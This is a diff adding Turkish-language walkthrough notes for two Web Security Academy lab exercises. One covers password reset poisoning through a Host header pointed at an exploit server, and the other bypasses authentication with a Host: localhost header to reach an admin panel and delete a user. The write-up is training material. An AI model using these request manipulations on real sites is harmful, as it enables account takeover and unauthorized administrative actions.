@@ -1,0 +1,30 @@
+1
+
+Temel parola sıfırlama zehirlenmesi
+
+Forgot password diyerek wienerin şifreyi değiştiriyoruz.
+Burp requestinden POST /forgot-password isteğini repeatere atıyoruz.
+
+Host: exploit-0a9100f40398d02d80b3c525013200d0.exploit-server.net
+csrf=vtIY5KMALMjac5AnfFT0hT0q0jPqlzRP&username=carlos
+olacak şekilde düzenliyoruz ve send ediyoruz.
+GET /forgot-password  isteğinde  temp-forgot-password-token olarak gönderilen tokeni carlos için oluşturuyor.
+Yeni bir password sıfırlama tokeni oluşturacak ve bunu access loglarından okuyabiliyoruz.
+Email sunucusuna ilk gelen mail adresindeki tokeni carlosa gelen tokenle güncelleyince carlos için şifre değiştirme sayfasına yönlendiriyor.
+https://0a6c006a039ad00c8018c6ef005600af.web-security-academy.net/my-account?id=carlos
+Ve parola değeri değiştirilmiş carlos kullanıcısı ile giriş yapınca lab çözülüyor.
+
+
+2
+
+Ana bilgisayar başlığı kimlik doğrulama atlama
+
+/robots.txt içinden /admin ulaştık.
+GET /admin İsteği Burp Repeater'a gönder .
+Burp Repeater'da Host başlığını değiştirin localhost ve isteği gönderin.
+<a href="/admin/delete?username=carlos"> => response üzerinden carlos silme kısmı.
+GET /admin/delete?username=carlos HTTP/2 => send ederek carlosun silindiğini görüyoruz.
+
+
+3
+
